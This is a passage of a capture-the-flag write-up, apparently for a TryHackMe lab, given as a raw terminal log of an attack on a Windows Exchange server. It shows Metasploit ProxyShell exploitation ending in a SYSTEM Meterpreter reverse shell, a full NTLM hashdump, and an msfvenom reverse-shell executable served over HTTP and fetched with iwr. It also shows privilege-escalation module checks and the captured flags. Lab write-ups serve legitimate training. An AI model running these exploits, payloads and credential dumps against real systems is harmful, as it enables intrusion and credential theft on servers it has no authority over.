-a----        1/25/2023  12:44 PM          67072 isatq.dll                                                             
-a----        1/25/2023  12:44 PM          25600 iscomlog.dll                                                          
-a----        1/25/2023  12:15 PM          24064 logcust.dll                                                           
-a----        1/25/2023  12:12 PM          36352 loghttp.dll                                                           
-a----        1/25/2023  12:54 PM          39424 logscrpt.dll                                                          
-a----        1/25/2023  12:15 PM            330 logtemp.sql                                                           
-a----        1/25/2023  12:54 PM          88064 logui.ocx                                                             
-a----        1/25/2023  12:44 PM         685464 MBSchema.bin.00000000h                                                
-a----        1/25/2023  12:44 PM         266906 MBSchema.xml                                                          
-a----         4/7/2023   8:57 AM          10152 MetaBase.xml                                                          
-a----        1/25/2023  12:44 PM         334848 metadata.dll                                                          
-a----        1/25/2023  12:11 PM         147456 Microsoft.Web.Administration.dll                                      
-a----        1/25/2023  12:12 PM        1052672 Microsoft.Web.Management.dll                                          
-a----        1/25/2023  12:11 PM          44032 modrqflt.dll                                                          
-a----        1/25/2023  12:12 PM         478720 nativerd.dll                                                          
-a----        1/25/2023  12:12 PM          27136 protsup.dll                                                           
-a----        1/25/2023  12:15 PM          21504 redirect.dll                                                          
-a----        1/25/2023  12:44 PM          10752 rpcref.dll                                                            
-a----        1/25/2023  12:12 PM          33792 rsca.dll                                                              
-a----        1/25/2023  12:12 PM          51200 rscaext.dll                                                           
-a----        1/25/2023  12:11 PM          40448 static.dll                                                            
-a----        1/25/2023  12:54 PM          18944 svcext.dll                                                            
-a----        1/25/2023  12:11 PM         189952 uihelper.dll                                                          
-a----        1/25/2023  12:15 PM          23552 urlauthz.dll                                                          
-a----        1/25/2023  12:54 PM          21504 validcfg.dll                                                          
-a----        1/25/2023  12:15 PM         146250 w3core.mof                                                            
-a----        1/25/2023  12:12 PM          16384 w3ctrlps.dll                                                          
-a----        1/25/2023  12:11 PM          29696 w3ctrs.dll                                                            
-a----        1/25/2023  12:11 PM         109568 w3dt.dll                                                              
-a----        1/25/2023  12:15 PM           2560 w3isapi.mof                                                           
-a----        1/25/2023  12:12 PM         101888 w3logsvc.dll                                                          
-a----        1/25/2023  12:12 PM          29184 w3tp.dll                                                              
-a----        1/25/2023  12:11 PM          26624 w3wp.exe                                                              
-a----        1/25/2023  12:12 PM          78336 w3wphost.dll                                                          
-a----        1/25/2023  12:44 PM          39936 wamreg.dll                                                            
-a----        1/25/2023  12:12 PM          31744 wbhstipm.dll                                                          
-a----        1/25/2023  12:12 PM          27648 wbhst_pm.dll                                                          
-a----        1/25/2023  12:15 PM         189952 webdav.dll                                                            
-a----        1/25/2023  12:15 PM          23552 webdav_simple_lock.dll                                                
-a----        1/25/2023  12:15 PM          20480 webdav_simple_prop.dll                                                
-a----        1/25/2023  12:54 PM          12288 WMSvc.exe                                                             
-a----        9/15/2018  12:13 AM            165 wmsvc.exe.config                                                      
-a----        1/25/2023  12:12 PM         169984 XPath.dll   

PS C:\windows\system32\inetsrv> cd c:/
PS C:\> dir


    Directory: C:\


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        1/25/2023  11:44 AM                934484d0a9de05fc41a4dc84                                              
d-----        1/26/2023  10:36 AM                ExchangeSetupLogs                                                     
d-----        1/25/2023  12:12 PM                inetpub                                                               
d-----        9/15/2018  12:19 AM                PerfLogs                                                              
d-r---        2/28/2023   2:23 PM                Program Files                                                         
d-----        1/25/2023  11:41 AM                Program Files (x86)                                                   
d-----        1/25/2023   1:34 PM                root                                                                  
d-r---        1/26/2023   1:16 PM                Users                                                                 
d-----        3/29/2023   2:34 AM                Windows                                                               
-a----         4/7/2023   8:57 AM             31 BitlockerActiveMonitoringLogs                                         


PS C:\> cd Users
PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        1/25/2023  12:54 PM                .NET v4.5                                                             
d-----        1/25/2023  12:54 PM                .NET v4.5 Classic                                                     
d-----        3/21/2023  11:40 AM                Administrator                                                         
d-----        2/21/2023  12:31 AM                dev                                                                   
d-r---        1/25/2023   8:15 PM                Public                                                                


PS C:\Users> cd Administrator
PS C:\Users\Administrator> dir
PS C:\Users\Administrator> dir -h
PS C:\Users\Administrator> dir /a:h
PS C:\Users\Administrator> cd ..
PS C:\Users> cd dev
PS C:\Users\dev> dir 


    Directory: C:\Users\dev


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-r---        1/26/2023   1:16 PM                3D Objects                                                            
d-r---        1/26/2023   1:16 PM                Contacts                                                              
d-r---        2/12/2023  11:54 AM                Desktop                                                               
d-r---        1/26/2023   1:16 PM                Documents                                                             
d-r---        1/26/2023   1:16 PM                Downloads                                                             
d-r---        1/26/2023   1:16 PM                Favorites                                                             
d-r---        1/26/2023   1:16 PM                Links                                                                 
d-r---        1/26/2023   1:16 PM                Music                                                                 
d-r---        1/26/2023   1:16 PM                Pictures                                                              
d-r---        1/26/2023   1:16 PM                Saved Games                                                           
d-r---        1/26/2023   1:16 PM                Searches                                                              
d-r---        1/26/2023   1:16 PM                Videos                                                                


PS C:\Users\dev> cd Desktop
PS C:\Users\dev\Desktop> dir


    Directory: C:\Users\dev\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        3/21/2023  12:28 PM            512 TODO.txt                                                              
-a----        2/12/2023  11:53 AM             29 user.txt                                                              


PS C:\Users\dev\Desktop> type user.txt
THM{Stop_Reading_Start_Doing}
PS C:\Users\dev\Desktop> type TODO.txt
Hey dev team,

This is the tasks list for the deadline:

Promote Server to Domain Controller [DONE]
Setup Microsoft Exchange [DONE]
Setup IIS [DONE]
Remove the log analyzer[TO BE DONE]
Add all the users from the infra department [TO BE DONE]
Install the Security Update for MS Exchange [TO BE DONE]
Setup LAPS [TO BE DONE]


When you are done with the tasks please send an email to:

joe@thm.local
carol@thm.local
and do not forget to put in CC the infra team!
dev-infrastracture-team@thm.local

Install the Security Update for MS Exchange

┌──(witty㉿kali)-[~/Downloads/maigret]
└─$ msfconsole -q
msf6 > search microsoft exchange

Matching Modules
================

   #   Name                                                          Disclosure Date  Rank       Check  Description
   -   ----                                                          ---------------  ----       -----  -----------
   0   exploit/windows/http/exchange_ecp_viewstate                   2020-02-11       excellent  Yes    Exchange Control Panel ViewState Deserialization
   1   auxiliary/scanner/http/exchange_web_server_pushsubscription   2019-01-21       normal     No     Microsoft Exchange Privilege Escalation Exploit
   2   auxiliary/gather/exchange_proxylogon_collector                2021-03-02       normal     No     Microsoft Exchange ProxyLogon Collector
   3   exploit/windows/http/exchange_proxylogon_rce                  2021-03-02       excellent  Yes    Microsoft Exchange ProxyLogon RCE
   4   auxiliary/scanner/http/exchange_proxylogon                    2021-03-02       normal     No     Microsoft Exchange ProxyLogon Scanner
   5   exploit/windows/http/exchange_proxynotshell_rce               2022-09-28       excellent  Yes    Microsoft Exchange ProxyNotShell RCE
   6   exploit/windows/http/exchange_proxyshell_rce                  2021-04-06       excellent  Yes    Microsoft Exchange ProxyShell RCE
   7   exploit/windows/http/exchange_chainedserializationbinder_rce  2021-12-09       excellent  Yes    Microsoft Exchange Server ChainedSerializationBinder RCE
   8   exploit/windows/http/exchange_ecp_dlp_policy                  2021-01-12       excellent  Yes    Microsoft Exchange Server DlpUtils AddTenantDlpPolicy RCE
   9   exploit/linux/local/cve_2021_38648_omigod                     2021-09-14       excellent  Yes    Microsoft OMI Management Interface Authentication Bypass
   10  auxiliary/gather/office365userenum                            2018-09-05       normal     No     Office 365 User Enumeration
   11  auxiliary/scanner/http/owa_iis_internal_ip                    2012-12-17       normal     No     Outlook Web App (OWA) / Client Access Server (CAS) IIS HTTP Internal IP Disclosure
   12  post/windows/gather/exchange                                                   normal     No     Windows Gather Exchange Server Mailboxes


Interact with a module by name or index. For example info 12, use 12 or use post/windows/gather/exchange

msf6 > use 3
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/http/exchange_proxylogon_rce) > show options

Module options (exploit/windows/http/exchange_proxylogon_rce):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   EMAIL                              yes       A known email address for this organization
   METHOD            POST             yes       HTTP Method to use for the check (Accepted: GET, POST)
   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                             yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT             443              yes       The target port (TCP)
   SSL               true             no        Negotiate SSL/TLS for outgoing connections
   SSLCert                            no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                            no        The URI to use for this exploit (default is random)
   UseAlternatePath  false            yes       Use the IIS root dir as alternate path
   VHOST                              no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,certutil,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all a
                                       ddresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.8.19.103      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows Powershell



View the full module info with the info, or info -d command.

msf6 exploit(windows/http/exchange_proxylogon_rce) > set RHOSTS 10.10.61.189
RHOSTS => 10.10.61.189
msf6 exploit(windows/http/exchange_proxylogon_rce) > set EMAIL joe@thm.local
EMAIL => joe@thm.local
msf6 exploit(windows/http/exchange_proxylogon_rce) > run

[*] Started reverse TCP handler on 10.8.19.103:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Using auxiliary/scanner/http/exchange_proxylogon as check
[-] https://10.10.61.189:443 - The target is not vulnerable to CVE-2021-26855.
[*] Scanned 1 of 1 hosts (100% complete)
[-] Exploit aborted due to failure: not-vulnerable: The target is not exploitable. "set ForceExploit true" to override check result.
[*] Exploit completed, but no session was created.
msf6 exploit(windows/http/exchange_proxylogon_rce) > search microsoft exchange

Matching Modules
================

   #   Name                                                          Disclosure Date  Rank       Check  Description
   -   ----                                                          ---------------  ----       -----  -----------
   0   exploit/windows/http/exchange_ecp_viewstate                   2020-02-11       excellent  Yes    Exchange Control Panel ViewState Deserialization
   1   auxiliary/scanner/http/exchange_web_server_pushsubscription   2019-01-21       normal     No     Microsoft Exchange Privilege Escalation Exploit
   2   auxiliary/gather/exchange_proxylogon_collector                2021-03-02       normal     No     Microsoft Exchange ProxyLogon Collector
   3   exploit/windows/http/exchange_proxylogon_rce                  2021-03-02       excellent  Yes    Microsoft Exchange ProxyLogon RCE
   4   auxiliary/scanner/http/exchange_proxylogon                    2021-03-02       normal     No     Microsoft Exchange ProxyLogon Scanner
   5   exploit/windows/http/exchange_proxynotshell_rce               2022-09-28       excellent  Yes    Microsoft Exchange ProxyNotShell RCE
   6   exploit/windows/http/exchange_proxyshell_rce                  2021-04-06       excellent  Yes    Microsoft Exchange ProxyShell RCE
   7   exploit/windows/http/exchange_chainedserializationbinder_rce  2021-12-09       excellent  Yes    Microsoft Exchange Server ChainedSerializationBinder RCE
   8   exploit/windows/http/exchange_ecp_dlp_policy                  2021-01-12       excellent  Yes    Microsoft Exchange Server DlpUtils AddTenantDlpPolicy RCE
   9   exploit/linux/local/cve_2021_38648_omigod                     2021-09-14       excellent  Yes    Microsoft OMI Management Interface Authentication Bypass
   10  auxiliary/gather/office365userenum                            2018-09-05       normal     No     Office 365 User Enumeration
   11  auxiliary/scanner/http/owa_iis_internal_ip                    2012-12-17       normal     No     Outlook Web App (OWA) / Client Access Server (CAS) IIS HTTP Internal IP Disclosure
   12  post/windows/gather/exchange                                                   normal     No     Windows Gather Exchange Server Mailboxes


Interact with a module by name or index. For example info 12, use 12 or use post/windows/gather/exchange

msf6 exploit(windows/http/exchange_proxylogon_rce) > use 6
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/http/exchange_proxyshell_rce) > show options

Module options (exploit/windows/http/exchange_proxyshell_rce):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   EMAIL                              no        A known email address for this organization
   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                             yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT             443              yes       The target port (TCP)
   SSL               true             no        Negotiate SSL/TLS for outgoing connections
   SSLCert                            no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                            no        The URI to use for this exploit (default is random)
   UseAlternatePath  false            yes       Use the IIS root dir as alternate path
   VHOST                              no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,certutil,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all a
                                       ddresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.8.19.103      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows Powershell



View the full module info with the info, or info -d command.

msf6 exploit(windows/http/exchange_proxyshell_rce) > set RHOSTS 10.10.61.189
RHOSTS => 10.10.61.189
msf6 exploit(windows/http/exchange_proxyshell_rce) > set EMAIL joe@thm.local
EMAIL => joe@thm.local
msf6 exploit(windows/http/exchange_proxyshell_rce) > run

[*] Started reverse TCP handler on 10.8.19.103:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Attempt to exploit for CVE-2021-34473
[*] Retrieving backend FQDN over RPC request
[*] Internal server name: win-12ouo7a66m7.thm.local
[-] Exploit aborted due to failure: not-found: No Autodiscover information was found
[*] Exploit completed, but no session was created.
msf6 exploit(windows/http/exchange_proxyshell_rce) > set EMAIL dev-infrastracture-team@thm.local
EMAIL => dev-infrastracture-team@thm.local
msf6 exploit(windows/http/exchange_proxyshell_rce) > run

[*] Started reverse TCP handler on 10.8.19.103:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Attempt to exploit for CVE-2021-34473
[*] Retrieving backend FQDN over RPC request
[*] Internal server name: win-12ouo7a66m7.thm.local
[*] Assigning the 'Mailbox Import Export' role via dev-infrastracture-team@thm.local
[+] Successfully assigned the 'Mailbox Import Export' role
[+] Proceeding with SID: S-1-5-21-2402911436-1669601961-3356949615-1144 (dev-infrastracture-team@thm.local)
[*] Saving a draft email with subject 'dfcULFY9W' containing the attachment with the embedded webshell
[*] Writing to: C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\vOtEHjiGN.aspx
[*] Waiting for the export request to complete...
[+] The mailbox export request has completed
[*] Triggering the payload
[*] Sending stage (200774 bytes) to 10.10.61.189
[+] Deleted C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\vOtEHjiGN.aspx
[*] Meterpreter session 1 opened (10.8.19.103:4444 -> 10.10.61.189:10923) at 2023-04-07 12:56:09 -0400
[*] Removing the mailbox export request
[*] Removing the draft email

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bd2a588da7537a43413f220ad79b3ec8:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:becd6ba4674b21daa8754fb35abeec4b:::
$231000-O0QPBLAP47AA:1122:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SM_fe3ac6e6c5c048879:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SM_9d95c1b345b24820a:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SM_fff1c36ebaee496d9:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SM_0bcc8f43b5d449549:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SM_de8cf2884b5344449:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SM_8732593a4dab45bab:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SM_01c36984a0954584b:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SM_77808a1914dd4685a:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SM_ccc03880b6df44e2b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HealthMailbox5d7068d:1134:aad3b435b51404eeaad3b435b51404ee:37abce6e37210ec39f229531f1f8bdd2:::
HealthMailbox451693b:1135:aad3b435b51404eeaad3b435b51404ee:4bc9c5bbad68f9baeb1d876847f4ed2c:::
HealthMailboxb417c9a:1136:aad3b435b51404eeaad3b435b51404ee:d9ecb7e1e395edecabe99a6eb1603e0d:::
HealthMailbox8e51e05:1137:aad3b435b51404eeaad3b435b51404ee:f3c329605223b757b66c88aaeb15c810:::
HealthMailbox07b8995:1138:aad3b435b51404eeaad3b435b51404ee:efbb97e093ef92096912f6006933ccf4:::
HealthMailbox82636a0:1139:aad3b435b51404eeaad3b435b51404ee:82b9f1f402ea6af44c03699ed824fc23:::
HealthMailboxd070f22:1140:aad3b435b51404eeaad3b435b51404ee:237e125929afa33eeea649baa40eab6e:::
HealthMailbox878368d:1141:aad3b435b51404eeaad3b435b51404ee:e7634c47e2ff6eafeca140aba65120ab:::
HealthMailbox661f7fa:1142:aad3b435b51404eeaad3b435b51404ee:89becb5b87b903a9ae142feb8087cde5:::
HealthMailbox7592f90:1143:aad3b435b51404eeaad3b435b51404ee:d44648e33d9c1d1ed54bca14ce4dab83:::
dev:1144:aad3b435b51404eeaad3b435b51404ee:bd2a588da7537a43413f220ad79b3ec8:::
HealthMailbox079218d:1147:aad3b435b51404eeaad3b435b51404ee:8b5ad17e6d2e17ad03c01ac04c46b381:::
admin:1149:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
WIN-12OUO7A66M7$:1000:aad3b435b51404eeaad3b435b51404ee:4862262e1bd19aae279c269e2043b836:::
meterpreter > search flag.txt
[-] You must specify a valid file glob to search for, e.g. >search -f *.doc
meterpreter > search -f flag.txt
Found 1 result...
=================

Path                                       Size (bytes)  Modified (UTC)
----                                       ------------  --------------
c:\Users\Administrator\Documents\flag.txt  35            2023-02-12 14:57:18 -0500

meterpreter > cat 'c:\Users\Administrator\Documents\flag.txt'
THM{Looking_Back_Is_Not_Always_Bad}

another way

https://www.kaspersky.es/blog/mysterysnail-cve-2021-40449/26246/

┌──(witty㉿kali)-[/tmp]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.8.19.103 LPORT="4444" -f exe -o hi.exe      
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: hi.exe

┌──(witty㉿kali)-[/tmp]
└─$ file hi.exe 
hi.exe: PE32+ executable (GUI) x86-64, for MS Windows, 3 sections

┌──(witty㉿kali)-[/tmp]
└─$ python3 -m http.server 1234         
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.61.189 - - [07/Apr/2023 13:10:20] "GET /hi.exe HTTP/1.1" 200 -

PS C:\Users\dev> cd Downloads
PS C:\Users\dev\Downloads> dir
PS C:\Users\dev\Downloads> iwr http://10.8.19.103:1234/hi.exe -outfile hi.exe
PS C:\Users\dev\Downloads> dir
PS C:\Users\dev\Downloads> iwr http://10.8.19.103:1234/hi.exe 
PS C:\Users\dev\Downloads> dir

┌──(witty㉿kali)-[/tmp]
└─$ sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.8.19.103; set LPORT '4444'; exploit"
[sudo] password for witty: 
[*] Using configured payload generic/shell_reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
LHOST => 10.8.19.103
LPORT => 4444
[*] Started reverse TCP handler on 10.8.19.103:4444 
[*] Sending stage (200774 bytes) to 10.10.61.189
[*] Meterpreter session 1 opened (10.8.19.103:4444 -> 10.10.61.189:11553) at 2023-04-07 13:11:44 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bd2a588da7537a43413f220ad79b3ec8:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:becd6ba4674b21daa8754fb35abeec4b:::
$231000-O0QPBLAP47AA:1122:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SM_fe3ac6e6c5c048879:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SM_9d95c1b345b24820a:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SM_fff1c36ebaee496d9:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SM_0bcc8f43b5d449549:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SM_de8cf2884b5344449:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SM_8732593a4dab45bab:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SM_01c36984a0954584b:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SM_77808a1914dd4685a:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SM_ccc03880b6df44e2b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HealthMailbox5d7068d:1134:aad3b435b51404eeaad3b435b51404ee:37abce6e37210ec39f229531f1f8bdd2:::
HealthMailbox451693b:1135:aad3b435b51404eeaad3b435b51404ee:4bc9c5bbad68f9baeb1d876847f4ed2c:::
HealthMailboxb417c9a:1136:aad3b435b51404eeaad3b435b51404ee:d9ecb7e1e395edecabe99a6eb1603e0d:::
HealthMailbox8e51e05:1137:aad3b435b51404eeaad3b435b51404ee:f3c329605223b757b66c88aaeb15c810:::
HealthMailbox07b8995:1138:aad3b435b51404eeaad3b435b51404ee:efbb97e093ef92096912f6006933ccf4:::
HealthMailbox82636a0:1139:aad3b435b51404eeaad3b435b51404ee:82b9f1f402ea6af44c03699ed824fc23:::
HealthMailboxd070f22:1140:aad3b435b51404eeaad3b435b51404ee:237e125929afa33eeea649baa40eab6e:::
HealthMailbox878368d:1141:aad3b435b51404eeaad3b435b51404ee:e7634c47e2ff6eafeca140aba65120ab:::
HealthMailbox661f7fa:1142:aad3b435b51404eeaad3b435b51404ee:89becb5b87b903a9ae142feb8087cde5:::
HealthMailbox7592f90:1143:aad3b435b51404eeaad3b435b51404ee:d44648e33d9c1d1ed54bca14ce4dab83:::
dev:1144:aad3b435b51404eeaad3b435b51404ee:bd2a588da7537a43413f220ad79b3ec8:::
HealthMailbox079218d:1147:aad3b435b51404eeaad3b435b51404ee:8b5ad17e6d2e17ad03c01ac04c46b381:::
admin:1149:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
WIN-12OUO7A66M7$:1000:aad3b435b51404eeaad3b435b51404ee:4862262e1bd19aae279c269e2043b836:::
meterpreter > cat 'c:\Users\Administrator\Documents\flag.txt'
THM{Looking_Back_Is_Not_Always_Bad}

meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.10.61.189 - Collecting local exploits for x64/windows...
[*] 10.10.61.189 - 181 exploit checks are being tried...
[+] 10.10.61.189 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The target appears to be vulnerable. Vulnerable Windows 10 v1809 build detected!
[+] 10.10.61.189 - exploit/windows/local/cve_2020_1048_printerdemon: The target appears to be vulnerable.
[+] 10.10.61.189 - exploit/windows/local/cve_2020_1337_printerdemon: The target appears to be vulnerable.
[+] 10.10.61.189 - exploit/windows/local/cve_2020_17136: The target appears to be vulnerable. A vulnerable Windows 10 v1809 build was detected!
[+] 10.10.61.189 - exploit/windows/local/cve_2021_40449: The target appears to be vulnerable. Vulnerable Windows 10 v1809 build detected!
[+] 10.10.61.189 - exploit/windows/local/cve_2022_21999_spoolfool_privesc: The target appears to be vulnerable.
[+] 10.10.61.189 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.61.189 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[*] Running check method for exploit 42 / 42
[*] 10.10.61.189 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The target appears to be vulnerable. Vulnerable Windows 10 v1809 build detected!
 2   exploit/windows/local/cve_2020_1048_printerdemon               Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/cve_2020_1337_printerdemon               Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/cve_2020_17136                           Yes                      The target appears to be vulnerable. A vulnerable Windows 10 v1809 build was detected!
 5   exploit/windows/local/cve_2021_40449                           Yes                      The target appears to be vulnerable. Vulnerable Windows 10 v1809 build detected!
 6   exploit/windows/local/cve_2022_21999_spoolfool_privesc         Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 8   exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
 9   exploit/windows/local/agnitum_outpost_acs                      No                       The target is not exploitable.
 10  exploit/windows/local/always_install_elevated                  No                       The target is not exploitable.
 11  exploit/windows/local/bits_ntlm_token_impersonation            No                       The target is not exploitable.
 12  exploit/windows/local/bypassuac_dotnet_profiler                No                       The target is not exploitable.
 13  exploit/windows/local/bypassuac_eventvwr                       No                       The target is not exploitable.
 14  exploit/windows/local/bypassuac_fodhelper                      No                       The target is not exploitable.
 15  exploit/windows/local/bypassuac_sdclt                          No                       The target is not exploitable.
 16  exploit/windows/local/bypassuac_sluihijack                     No                       The target is not exploitable.
 17  exploit/windows/local/canon_driver_privesc                     No                       The target is not exploitable. No Canon TR150 driver directory found
 18  exploit/windows/local/capcom_sys_exec                          No                       Cannot reliably check exploitability.
 19  exploit/windows/local/cve_2019_1458_wizardopium                No                       The target is not exploitable.
 20  exploit/windows/local/cve_2020_0796_smbghost                   No                       The target is not exploitable.
 21  exploit/windows/local/cve_2020_1054_drawiconex_lpe             No                       The target is not exploitable. No target for win32k.sys version 10.0.17763.1
 22  exploit/windows/local/cve_2020_1313_system_orchestrator        No                       The target is not exploitable.
 23  exploit/windows/local/cve_2021_21551_dbutil_memmove            No                       The target is not exploitable.
 24  exploit/windows/local/cve_2022_21882_win32k                    No                       The target is not exploitable.
 25  exploit/windows/local/cve_2022_3699_lenovo_diagnostics_driver  No                       The target is not exploitable.
 26  exploit/windows/local/gog_galaxyclientservice_privesc          No                       The target is not exploitable. Galaxy Client Service not found
 27  exploit/windows/local/ikeext_service                           No                       The check raised an exception.
 28  exploit/windows/local/lexmark_driver_privesc                   No                       The target is not exploitable. No Lexmark print drivers in the driver store
 29  exploit/windows/local/ms10_092_schelevator                     No                       The target is not exploitable. Windows 2016+ (10.0 Build 17763). is not vulnerable
 30  exploit/windows/local/ms14_058_track_popup_menu                No                       Cannot reliably check exploitability.
 31  exploit/windows/local/ms15_051_client_copy_image               No                       The target is not exploitable.
 32  exploit/windows/local/ms15_078_atmfd_bof                       No                       Cannot reliably check exploitability.
 33  exploit/windows/local/ms16_014_wmi_recv_notif                  No                       The target is not exploitable.
 34  exploit/windows/local/ms16_075_reflection_juicy                No                       The target is not exploitable.
 35  exploit/windows/local/ntapphelpcachecontrol                    No                       The target is not exploitable.
 36  exploit/windows/local/nvidia_nvsvc                             No                       The check raised an exception.
 37  exploit/windows/local/panda_psevents                           No                       The target is not exploitable.
 38  exploit/windows/local/ricoh_driver_privesc                     No                       The target is not exploitable. No Ricoh driver directory found
 39  exploit/windows/local/srclient_dll_hijacking                   No                       The target is not exploitable. Target is not Windows Server 2012.
 40  exploit/windows/local/tokenmagic                               No                       The target is not exploitable.
 41  exploit/windows/local/virtual_box_opengl_escape                No                       The target is not exploitable.
 42  exploit/windows/local/webexec                                  No                       The check raised an exception.

meterpreter > run exploit/windows/local/cve_2021_40449
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```

What is the service user flag?

Have you checked all the paths?

*THM{Security_Through_Obscurity_Is_Not_A_Defense}*

What is the user flag?

Reading can change your perspective!

*THM{Stop_Reading_Start_Doing}*

What is the root flag?

All the way back! Where did you start?

